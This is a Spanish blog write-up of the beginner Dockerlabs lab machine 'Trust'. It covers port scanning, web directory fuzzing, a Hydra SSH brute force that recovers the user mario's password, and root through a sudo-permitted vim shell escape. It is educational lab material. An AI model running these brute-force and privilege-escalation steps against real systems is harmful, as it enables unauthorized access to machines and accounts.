---
title: "[ES] Writeup - Trust Dockerlabs"
date: 2025-04-12T00:00:00+00:00
tags: ["hacking", "spanish","cybersec","writeups","dockerlabs"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Un breve writeup de la máquina Trust de Dockerlabs"
---

Esta es una máquina trivial de Dockerlabs que se basa en la exploración web básica, la fuerza bruta SSH y la escalada de privilegios mediante una mala configuración de sudoers.

Instanciamos el contenedor:

``` bash
./auto_deploy.sh trust.tar

	                   ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Iniciamos con el escaneo de puertos:

``` bash
sudo nmap -Pn -sS -T4 -p- 172.18.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 18:03 CEST
Nmap scan report for 172.18.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 7E:B9:33:C2:F4:6E (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds

sudo nmap -sS -A -p 22,80,21 172.18.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 18:04 CEST
Nmap scan report for 172.18.0.2
Host is up (0.000094s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open   http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 7E:B9:33:C2:F4:6E (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.09 ms 172.18.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
```

Sabiendo que es una máquina fácil vamos a pasar directamente al fuzzing de directorios de la web:

``` bash
feroxbuster --url http://172.18.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -x txt -x git -x bak
                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.18.0.2
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, git, bak]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      127w    10359c http://172.18.0.2/icons/openlogo-75.png
200      GET      368l      933w    10701c http://172.18.0.2/
200      GET       39l       78w      927c http://172.18.0.2/secret.php
```

Veamos secret.php:

``` bash
curl http://172.18.0.2/secret.php
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Secreto!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hola Mario,</h1>
        <p>Esta web no se puede hackear.</p>
    </div>
</body>
</html>
```

No es demasiada info, en un CTF más complicado quedarían muchas cosas que enumerar para ver si realmente esta web se puede hackear, pero sabiendo que es una máquina fácil el nombre Mario seguramente sea una pista para hacer fuerza bruta en SSH.

``` bash
hydra -l mario -P /usr/share/seclists/Passwords/probable-v2-top12000.txt ssh://172.18.0.2

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-12 18:10:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 12645 login tries (l:1/p:12645), ~791 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

Muy bien, iniciamos sesión y una vez dentro vemos que podemos utilizar vim como cualquier usuario:

``` bash
mario@6e879b5225dd:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 6e879b5225dd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 6e879b5225dd:
    (ALL) /usr/bin/vim
```

Con vim podriamos leer y escribir en cualquier archivo, pero la opción agradable de usar es el escape a shell, ya que esta será en root.

``` bash
sudo vim -c ':!/bin/sh'
```

Y somos root.
